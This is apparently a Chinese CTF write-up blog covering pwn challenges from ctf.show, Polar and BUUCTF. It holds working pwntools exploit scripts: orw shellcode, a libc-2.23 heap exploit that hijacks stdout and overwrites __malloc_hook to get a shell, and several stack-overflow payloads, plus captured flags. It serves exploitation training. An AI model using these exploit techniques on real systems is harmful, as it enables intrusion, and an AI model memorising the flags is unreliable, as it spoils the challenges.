<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">orw = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00\x10&#x27;</span>+orw <span class="comment"># \x10 是换行符</span></span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>不可打印字符（non-printable characters）是指在计算机字符集中不对应于可见符号或图形的字符。这些字符通常用于控制文本的格式、流控制、数据结构或者是特殊的功能，而不是直接表示人类可读的内容。</p>
<h3 id="1-不可打印字符的分类"><a href="#1-不可打印字符的分类" class="headerlink" title="1. 不可打印字符的分类"></a>1. 不可打印字符的分类</h3><p>不可打印字符通常可以分为以下几类：</p>
<ul>
<li><p><strong>控制字符</strong>：这些字符用于控制设备（如打印机或终端）的行为。例如：</p>
<ul>
<li><strong>换行（Line Feed, LF）</strong>：<code>\n</code>（ASCII 10），用于换行。</li>
<li><strong>回车（Carriage Return, CR）</strong>：<code>\r</code>（ASCII 13），用于返回到行首。</li>
<li><strong>制表符（Tab）</strong>：<code>\t</code>（ASCII 9），用于插入水平制表。</li>
<li><strong>警告音（Bell）</strong>：<code>\a</code>（ASCII 7），用于发出声音提示。</li>
</ul>
</li>
<li><p><strong>终止字符</strong>：如 <code>null</code> 字符 <code>\0</code>（ASCII 0），常用于标记字符串的结束。</p>
</li>
<li><p><strong>特殊控制字符</strong>：如 <code>ESC</code>（ASCII 27），用于引入控制序列。</p>
</li>
</ul>
<h3 id="2-不可打印字符的ASCII码"><a href="#2-不可打印字符的ASCII码" class="headerlink" title="2. 不可打印字符的ASCII码"></a>2. 不可打印字符的ASCII码</h3><p>以下是一些常见的不可打印字符及其对应的 ASCII 码：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
<th>ASCII 码</th>
</tr>
</thead>
<tbody><tr>
<td><code>NUL</code></td>
<td>空字符（null）</td>
<td>0</td>
</tr>
<tr>
<td><code>SOH</code></td>
<td>标题开始</td>
<td>1</td>
</tr>
<tr>
<td><code>STX</code></td>
<td>正文开始</td>
<td>2</td>
</tr>
<tr>
<td><code>ETX</code></td>
<td>正文结束</td>
<td>3</td>
</tr>
<tr>
<td><code>EOT</code></td>
<td>传输结束</td>
<td>4</td>
</tr>
<tr>
<td><code>ENQ</code></td>
<td>请求</td>
<td>5</td>
</tr>
<tr>
<td><code>ACK</code></td>
<td>确认</td>
<td>6</td>
</tr>
<tr>
<td><code>BEL</code></td>
<td>响铃</td>
<td>7</td>
</tr>
<tr>
<td><code>BS</code></td>
<td>退格</td>
<td>8</td>
</tr>
<tr>
<td><code>HT</code></td>
<td>水平制表符</td>
<td>9</td>
</tr>
<tr>
<td><code>LF</code></td>
<td>换行</td>
<td>10</td>
</tr>
<tr>
<td><code>VT</code></td>
<td>垂直制表符</td>
<td>11</td>
</tr>
<tr>
<td><code>FF</code></td>
<td>换页</td>
<td>12</td>
</tr>
<tr>
<td><code>CR</code></td>
<td>回车</td>
<td>13</td>
</tr>
<tr>
<td><code>SO</code></td>
<td>转换为旁路</td>
<td>14</td>
</tr>
<tr>
<td><code>SI</code></td>
<td>转换为内部</td>
<td>15</td>
</tr>
<tr>
<td><code>ESC</code></td>
<td>转义</td>
<td>27</td>
</tr>
<tr>
<td><code>DEL</code></td>
<td>删除</td>
<td>127</td>
</tr>
</tbody></table>
<h3 id="3-应用场景"><a href="#3-应用场景" class="headerlink" title="3. 应用场景"></a>3. 应用场景</h3><p>不可打印字符在计算机编程和文本处理中的应用非常广泛，包括但不限于：</p>
<ul>
<li><strong>文本格式和控制</strong>：在终端或打印机输出时，控制字符用来格式化输出。</li>
<li><strong>数据结构</strong>：在某些数据结构中，特定的字符可能被用作分隔符或结束符。</li>
<li><strong>协议设计</strong>：在网络通信协议中，不可打印字符可能用于标记消息的开始和结束，或者表示特定的控制信息。</li>
</ul>
<p><strong>不可打印字符在安全中的作用</strong></p>
<p>在安全场景中，不可打印字符经常被用作绕过过滤器和检查的手段。例如：</p>
<ul>
<li><strong>缓冲区溢出攻击</strong>：攻击者可能会插入不可打印字符，以欺骗安全检查并执行恶意代码。</li>
<li><strong>注入攻击</strong>：在某些情况下，攻击者可能会通过注入不可打印字符来操纵输入，绕过输入验证。</li>
</ul>
<h2 id="pwn162"><a href="#pwn162" class="headerlink" title="pwn162"></a>pwn162</h2><p>有些东西在早些版本是有缺陷的？</p>
<ul>
<li>远程环境：Ubuntu 16.04</li>
</ul>
<p>思路：</p>
<p>首先明确在free时，程序会在free的chunk的fd处写0，并且show()函数无用所以要打stdout</p>
<ul>
<li>利用unsortedbin的特性在chunk上留下libc地址（通过chunk shrink)，该chunk称chunk A</li>
<li>利用程序的特性，<strong>部分覆盖</strong>使其1&#x2F;16指向_IO_2_1_stdout_附近</li>
<li>fastbin_dup(<strong>partial write</strong>)使chunk A链入fastbin那么stdout附近的那个chunk(B)就也被链入了fastbin</li>
<li>申请出chunk B修改stdout的flag-&gt;0xfbad1800 和 write_base的低位 -&gt; \x00，并计算地址</li>
<li>用realloc调整栈帧使one_gadget成立</li>
</ul>
<blockquote>
<p>为什么覆盖libc地址的低2字节为b”\xdd\x25”？</p>
</blockquote>
<p>在gdb中查看_IO_list_all的地址，可以看到stdout，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p (void*)_IO_list_all</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x7f8fe0a6b540 &lt;_IO_2_1_stderr_&gt;</span><br><span class="line">pwndbg&gt; p/x &amp;_IO_list_all</span><br><span class="line"><span class="variable">$2</span> = 0x7f8fe0a6b520</span><br><span class="line">pwndbg&gt; x/20gx 0x7f8fe0a6b520</span><br><span class="line">0x7f8fe0a6b520 &lt;_IO_list_all&gt;:  0x00007f8fe0a6b540      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b530: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b540 &lt;_IO_2_1_stderr_&gt;:       0x00000000fbad2086      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b550 &lt;_IO_2_1_stderr_+16&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b560 &lt;_IO_2_1_stderr_+32&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b570 &lt;_IO_2_1_stderr_+48&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b580 &lt;_IO_2_1_stderr_+64&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b590 &lt;_IO_2_1_stderr_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b5a0 &lt;_IO_2_1_stderr_+96&gt;:    0x0000000000000000      0x00007f8fe0a6b620</span><br><span class="line">0x7f8fe0a6b5b0 &lt;_IO_2_1_stderr_+112&gt;:   0x0000000000000002      0xffffffffffffffff</span><br><span class="line">pwndbg&gt;</span><br><span class="line">0x7f8fe0a6b5c0 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000      0x00007f8fe0a6c770</span><br><span class="line">0x7f8fe0a6b5d0 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b5e0 &lt;_IO_2_1_stderr_+160&gt;:   0x00007f8fe0a6a660      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b5f0 &lt;_IO_2_1_stderr_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b600 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b610 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007f8fe0a696e0</span><br><span class="line">0x7f8fe0a6b620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007f8fe0a6b6a3</span><br><span class="line">0x7f8fe0a6b630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007f8fe0a6b6a3      0x00007f8fe0a6b6a3</span><br><span class="line">0x7f8fe0a6b640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007f8fe0a6b6a3      0x00007f8fe0a6b6a3</span><br><span class="line">0x7f8fe0a6b650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007f8fe0a6b6a3      0x00007f8fe0a6b6a3</span><br></pre></td></tr></table></figure>

<p>因为我们要在stdout上写入，就必须把它申请出来，并且<strong>fastbin取出chunk是要检查size域的</strong>，所以我们必须要在stdout附近伪造chunk，一般在libc地址上伪造的chunk的size都为7f </p>
<p>通过观察发现如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x7f8fe0a6b620-0x43</span><br><span class="line">0x7f8fe0a6b5dd &lt;_IO_2_1_stderr_+157&gt;:   0x8fe0a6a660000000      0x000000000000007f&lt;--size</span><br><span class="line">0x7f8fe0a6b5ed &lt;_IO_2_1_stderr_+173&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b5fd &lt;_IO_2_1_stderr_+189&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f8fe0a6b60d &lt;_IO_2_1_stderr_+205&gt;:   0x0000000000000000      0x8fe0a696e0000000</span><br><span class="line">0x7f8fe0a6b61d &lt;_IO_2_1_stderr_+221&gt;:   0x00fbad288700007f      0x8fe0a6b6a3000000</span><br><span class="line">0x7f8fe0a6b62d &lt;_IO_2_1_stdout_+13&gt;:    0x8fe0a6b6a300007f      0x8fe0a6b6a300007f</span><br><span class="line">0x7f8fe0a6b63d &lt;_IO_2_1_stdout_+29&gt;:    0x8fe0a6b6a300007f      0x8fe0a6b6a300007f</span><br><span class="line">0x7f8fe0a6b64d &lt;_IO_2_1_stdout_+45&gt;:    0x8fe0a6b6a300007f      0x8fe0a6b6a300007f</span><br><span class="line">0x7f8fe0a6b65d &lt;_IO_2_1_stdout_+61&gt;:    0x8fe0a6b6a400007f      0x000000000000007f</span><br><span class="line">...</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>如上，在 0x7f8fe0a6b5dd 处可以很好的伪造size，后三位为 5dd 所以我们写libc低2字节为b”\xdd\x25”就有1&#x2F;16的概率指向stdout附近。</p>
<p>最后再次通过fastbin_dup申请到__malloc_hook附近用one_gadget来getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-30 19:26:43</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28238</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,message</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;size of the daniu&#x27;s name: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;daniu&#x27;s name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">b&quot;daniu&#x27;s message:&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod</span>(<span class="params">size,name,message</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;size of the daniu&#x27;s name: \n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&quot;daniu&#x27;s name:\n&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">b&quot;daniu&#x27;s message:\n&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;daniu&#x27;s index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;\xdd\x25&quot;</span></span><br><span class="line"><span class="comment">##要打IO（hijack stdout）就要在fd或bk指针上留下libc值</span></span><br><span class="line"><span class="comment">##先free一个大的进入unsortedbin，再分配一个相对较小的就可以在它的fd bk上留下libc地址</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#4</span></span><br><span class="line"><span class="comment">#在chunk上留下libc地址</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">##利用程序的特性，部分地址覆盖使其1/16指向_IO_2_1_stdout_附近</span></span><br><span class="line">mod(<span class="number">0x60</span>,offset,offset)  <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##fastbin_dup在fastbin链上留下IOstdout附近的地址</span></span><br><span class="line"><span class="comment">##将其申请出改写</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">mod(<span class="number">0x68</span>,<span class="string">b&#x27;\xd0&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\xd0&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\xd0&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\xd0&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>) <span class="comment">#9</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;Your choice : &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;size of the daniu&#x27;s name: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line">sa(<span class="string">b&quot;daniu&#x27;s name:\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">##接收地址并计算</span></span><br><span class="line">data = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">libc_base = data - <span class="number">0x3c5600</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">malloc_hook = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">fake_chunk = malloc_hook-<span class="number">0x23</span></span><br><span class="line">sl(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">leak(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line">leak(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">leak(<span class="string">&#x27;realloc&#x27;</span>,realloc)</span><br><span class="line"></span><br><span class="line"><span class="comment">##fastbin_dup申请到__malloc_hook附近</span></span><br><span class="line"><span class="comment">##realloc()调整栈帧，one_gadget来getshell</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(fake_chunk),<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x13</span>+p64(one_gadget)+p64(realloc+<span class="number">0x6</span>),<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice : &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="pwn164"><a href="#pwn164" class="headerlink" title="pwn164"></a>pwn164</h2><p>这题用的是realloc分配内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">realloc</span>(<span class="type">void</span>* ptr, <span class="type">size_t</span> size)</span><br></pre></td></tr></table></figure>


<p>关于realloc有几个重要的知识点：</p>
<ul>
<li><p>realloc(ptr,0)相当于free函数</p>
</li>
<li><p>realloc(0.size)相当于malloc函数</p>
</li>
<li><p>realloc(ptr,size)</p>
<ul>
<li><p>newsize&lt;size：进行分割，剩下的chunk如果大于等于MINSIZE则进行free</p>
</li>
<li><p>newsize&lt;size：</p>
<ul>
<li>next 为top且满足需求，直接从top切割</li>
<li>next为freechunk 且满足要求先合并(unlink)再切割</li>
<li>next不满足要求进行malloc(newsize)，然后进行数据拷贝，free原chun</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>关于 realloc的详细介绍，看这位大佬的blog： <a href="https://squarepants0.github.io/2020/11/18/2019-realloc-magic-realloc-yu-tcache/#toc-heading-2">realloc相关知识点</a></p>
<p><strong>解题:</strong></p>
<p>本题就两个函数一个realloc,一个free函数。很简单</p>
<p>在realloc的时候,因为每次都是使用realloc_ptr,并且没有变化,导致每次申请的的chunk都会写在realloc_ptr指向的地址,再次申请比上一次的size大就可以往后溢</p>
<p><strong>利用思路：</strong></p>
<p>主要利用基础：UAF，double free</p>
<p>注意到题目中是没有show类型的函数的，<strong>所以想进行地址泄露应该要靠IO_FILE攻击</strong></p>
<p>难点：<strong>利用realloc进行堆块合并后，再利用UAF进行地址覆盖</strong></p>
<h1 id="polar靶场"><a href="#polar靶场" class="headerlink" title="polar靶场"></a>polar靶场</h1><h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><p>输入 $0 即可绕过那几个检查</p>
<p> <strong>1. <code>$0</code> 的基本含义</strong></p>
<ul>
<li><strong>在脚本中</strong>：<code>$0</code> 表示正在运行的脚本名称。<br>例如，执行脚本 <code>./test.sh</code> 时，<code>$0</code> 的值是 <code>./test.sh</code>。</li>
<li><strong>在交互式 Shell 中</strong>：<code>$0</code> 表示当前 Shell 的名称（如 <code>bash</code>、<code>sh</code>、<code>zsh</code>）。<br>例如，在 Bash 中输入 <code>echo $0</code>，输出通常是 <code>bash</code>。</li>
</ul>
<h2 id="creeper"><a href="#creeper" class="headerlink" title="creeper"></a>creeper</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Creeper?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(buf) == <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Aw man&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Si............&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入15个字符就行，如：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">aaaabbbbaaaabb\n</span><br></pre></td></tr></table></figure>

<h2 id="hahaha"><a href="#hahaha" class="headerlink" title="hahaha"></a>hahaha</h2><p>后门直接溢出就行，高版本需要有栈平衡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>) + p64(<span class="number">0x0000000000400441</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line">sl(payload)	</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>溢出改栈上的变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ps = <span class="string">b&quot;lovecat&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x74616365766F6C</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1 id="buu"><a href="#buu" class="headerlink" title="buu"></a>buu</h1><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>题目给出ubuntu18,.且是64位程序需要考虑栈平衡</p>
<p>lambda部分省略</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">flag = <span class="number">0x401186</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(flag)</span><br><span class="line"><span class="comment">#ru(b&#x27;please input&#x27;)</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">flag&#123;2b384cc7-6cc9-4d5e-a659-0635a86cdad5&#125;</span><br></pre></td></tr></table></figure>

<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>ubuntu16.04，题目给出了一个地址可以<code>cat flag.txt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru(<span class="string">b&#x27;WOW:&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(flag))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(flag)</span><br><span class="line">ru(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>栈溢出修改栈上的变量，计算出两个变量的位之差</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28132</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2c</span> + struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, <span class="number">11.28125</span>) <span class="comment"># + p64(0x41348000)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>ubuntu16.04（在其他版本也行）程序将<code>I</code>替换为<code>you</code>通过<code>strcpy</code>造成了溢出，有后门函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">padding = <span class="number">20</span> <span class="comment"># 0x3c = 60; 60/3=20;</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*padding + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x8048f0d</span>)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>



<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>ubuntu16.04 read()栈溢出有后门</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">flag&#123;16a465c7-eed0-4eda-8fcb-dd5ca85ee50d&#125;</span><br></pre></td></tr></table></figure>

